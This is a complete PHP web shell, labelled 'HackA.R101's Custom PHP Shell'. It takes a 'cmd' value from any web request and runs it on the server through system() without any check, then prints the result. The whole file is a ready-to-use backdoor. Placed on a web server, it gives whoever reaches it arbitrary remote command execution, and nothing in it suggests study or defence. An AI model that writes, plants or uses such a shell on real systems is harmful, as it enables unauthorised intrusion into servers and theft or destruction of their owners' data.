<?php
echo "<h3>💀 HackA.R101's Custom PHP Shell 💀</h3>";

if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
} else {
    echo "✅ Shell is working. Use <code>?cmd=your_command</code>";
}
?>
